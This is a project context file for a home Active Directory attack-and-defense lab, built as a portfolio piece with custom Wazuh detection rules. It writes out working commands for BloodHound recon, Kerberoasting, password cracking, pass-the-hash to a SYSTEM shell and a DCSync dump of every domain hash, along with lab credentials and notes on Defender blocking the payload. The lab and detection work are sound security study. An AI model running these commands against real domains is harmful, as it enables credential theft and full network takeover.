
Context · MD
# Project Context — AD Attack & Defense Lab
 
This file exists to give an AI assistant (or a human collaborator) full context on this project without needing the original chat history. It covers what the lab is, how it was built, what went wrong along the way, and what's left to do.
 
---
 
## What this project is
 
A self-built Active Directory security lab that runs a full attack chain from a single phished user account to complete domain compromise, then detects each stage using native Windows event logs and a custom Wazuh SIEM rule. It's a portfolio project for a cybersecurity internship search. The headline achievement is a custom Wazuh detection rule for DCSync, which Wazuh does not catch by default.
 
Repo name: `ad-attack-defense-lab`
 
---
 
## Lab architecture
 
Four VMs in VMware, all on an isolated host-only network `192.168.1.0/24`, each with a second NAT adapter for internet access.
 
| Host | Role | OS | IP |
|------|------|-----|-----|
| DC01 | Domain Controller (`LABBOX.local`) | Windows Server 2022 | 192.168.1.10 |
| WS01 | Domain-joined workstation | Windows 11 | 192.168.1.20 |
| Kali | Attacker | Kali Linux | 192.168.1.250 |
| Wazuh | SIEM / log analysis | Ubuntu Server | 192.168.1.15 |
 
Domain: `LABBOX.local`
 
### Domain accounts created
- `j.rivera` — Finance, password `Summer2025!`. The "phished" low-privilege employee. Used as the initial foothold. Had "user must change password at next logon" set, which had to be unchecked before it could authenticate to tooling.
- `m.chen` — IT, password `Password123!`.
- `svc-sql` — service account, password `Welcome1` (deliberately weak / in rockyou.txt), Password Never Expires, SPN set with `setspn -a DC01/svc-sql.LABBOX.local:60111 LABBOX\svc-sql`. This is the account that gets Kerberoasted and becomes the escalation vehicle.
---
 
## The attack chain (what was actually done)
 
```
j.rivera (phished, low priv)
  -> BloodHound recon
  -> Kerberoast svc-sql, crack password offline (Welcome1)
  -> Pass-the-Hash into WS01 as SYSTEM
  -> DCSync (svc-sql has delegated replication rights) -> dump entire domain
```
 
Key detail: the escalation from `j.rivera` is credential-based (crack a weak password), not permission-based. This matters for the BloodHound section (see below).
 
### 1. Recon — BloodHound
`bloodhound-python -u j.rivera -p 'Summer2025!' -d labbox.local -ns 192.168.1.10 -c All --zip`
Collected 2 computers, 7 users, 52 groups, 3 OUs. Imported into BloodHound CE.
 
### 2. Kerberoasting (T1558.003)
`impacket-GetUserSPNs labbox.local/j.rivera:'Summer2025!' -dc-ip 192.168.1.10 -request -outputfile kerberoast.hash`
Cracked with John the Ripper (not hashcat — see troubleshooting): `john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hash`. Password fell in under a second: `Welcome1`.
 
### 3. Pass-the-Hash (T1550.002)
Computed svc-sql's NT hash from the known password, then:
`impacket-psexec -hashes :<NT_HASH> LABBOX/svc-sql@192.168.1.20`
Landed a SYSTEM shell on WS01. svc-sql had been granted local admin on WS01 to simulate a common misconfiguration.
 
### 4. DCSync (T1003.006)
svc-sql was granted Replicating Directory Changes / Replicating Directory Changes All on the domain object.
`impacket-secretsdump -hashes :<NT_HASH> LABBOX/svc-sql@192.168.1.10`
Dumped every credential hash in the domain including krbtgt. Full domain compromise.
 
---
 
## Detection & defense work
 
### Native Windows event signatures
- Kerberoasting → Event 4769, ticket encryption type 0x17 (RC4)
- Pass-the-Hash → Event 4624, Logon Type 3 + NTLM auth package
- DCSync → Event 4662, replication-rights GUID `{1131f6aa-...}` or `{1131f6ad-...}`
Audit policy on DC01 was configured via Group Policy (Advanced Audit Policy) to log 4769, 4662, and 4624, then `gpupdate /force`.
 
### Custom Wazuh rules
Three custom rules live in `/var/ossec/etc/rules/local_rules.xml` (also committed to the repo as `local_rules.xml`):
- Rule 100200 — Kerberoasting (4769 + RC4)
- Rule 100220 — Pass-the-Hash (4624 + Type 3 + NTLM)
- Rule 100010 — DCSync (4662 + either replication GUID), level 12, mapped to T1003.006
Important note on rule IDs: the DCSync rule is 100010 (not sequential with the others). This is intentional. It was built and tested first, during live troubleshooting, and its ID matches the Wazuh alert screenshot. Do not renumber it, because that would break the match between the rule and the screenshot evidence. The DCSync rule was verified firing live (a burst of ~24 level-12 alerts in a 3-second window). The Kerberoasting and PtH rules are accurate and based on real captured events, but were not individually screenshotted firing in Wazuh — the native Event Viewer evidence covers all three.
 
---
 
## BloodHound findings (important nuance)
 
The standard "shortest path from j.rivera to Domain Admins" query returns "Path not found." This is CORRECT and should be presented as a real finding, not hidden. BloodHound maps ACL/permission edges; j.rivera has none. Its only capability is requesting Kerberos tickets, and the real escalation happens by cracking a password offline, which BloodHound cannot represent as a graph edge.
 
After granting svc-sql its rights and RE-COLLECTING (the original scan predated the permission grant), a real path DOES render from `svc-sql` to Domain Admins, via GenericWrite on DC01's computer object and a CoerceToTGT relationship into the domain, then Contains edges down to Domain Admins. This is the graph worth showing.
 
So the README presents both: the honest j.rivera "Path not found", and the real svc-sql path.
 
---
 
## Troubleshooting war stories (the real journey)
 
These are worth knowing because they shaped decisions and are referenced in the README's "What I ran into" section:
 
- **Kerberos clock skew** — KRB_AP_ERR_SKEW errors repeatedly blocked Kerberoasting and DCSync. Root cause was a timezone mismatch (DC01 was on Pacific, Kali on Eastern/UTC) even when wall-clock times looked similar. Fixed by force-syncing Kali's clock to DC01's actual UTC time. This recurred after VM restarts.
- **BloodHound-python wrong IP** — first attempts used 192.168.10.10 (old subnet from an earlier draft) instead of the real 192.168.1.10.
- **BloodHound CE setup** — Kali's newer `bloodhound` command is deprecated; the launcher is `bloodhound-start`. It depends on both Neo4j AND PostgreSQL running. Neither auto-starts reliably after a reboot. The `bhapi.json` config (at `/etc/bhapi/bhapi.json`) must have the Neo4j password matching the actual Neo4j password. A typo (`Linus123!` vs `Linux123!`) caused a silent hang. Web UI login is admin/admin (separate from the Neo4j DB creds). Login is at http://127.0.0.1:8080/ui/login.
- **hashcat had no GPU** in the VM (no OpenCL runtime). Switched to John the Ripper, which is CPU-native. The README reflects John, not hashcat.
- **WS01 broken domain trust** — "trust relationship between this workstation and the primary domain failed" after VM restarts/suspends. Fixed with `Test-ComputerSecureChannel -Repair -Credential LABBOX\Administrator`.
- **Windows Defender + Tamper Protection** blocked the psexec payload repeatedly. Real-time protection kept re-enabling itself because Tamper Protection was on, and Tamper Protection can only be turned off in the Windows Security GUI, not via PowerShell. The initial Defender detections are actually a nice "built-in AV caught it" data point.
- **Wazuh disk exhaustion** — the indexer/manager crash-looped because root hit 100% full, repeatedly. The culprit was `/var/ossec/queue/vd_updater` (21GB) and `/var/ossec/queue/vd` (6.6GB), which is the Vulnerability Detection module's CVE feed cache. Safe to clear. Wazuh service start order is indexer -> manager -> dashboard.
- **DCSync events not reaching Wazuh** — the first DCSync run happened while the Wazuh manager was crashed (disk full), so those events never got ingested even though DC01's Security log recorded them fine. Also, Wazuh does not index 4662 by default unless a rule matches, and archive logging (`logall`) was off. The fix was the custom rule 100010, which finally caught it once Wazuh was stable and the DC01 agent was reconnected.
- **Wazuh agents show disconnected after reboots** — DC01's WazuhSvc needs restarting (`Restart-Service WazuhSvc`) and the dashboard Agents page needs a Refresh before status flips to Active.
---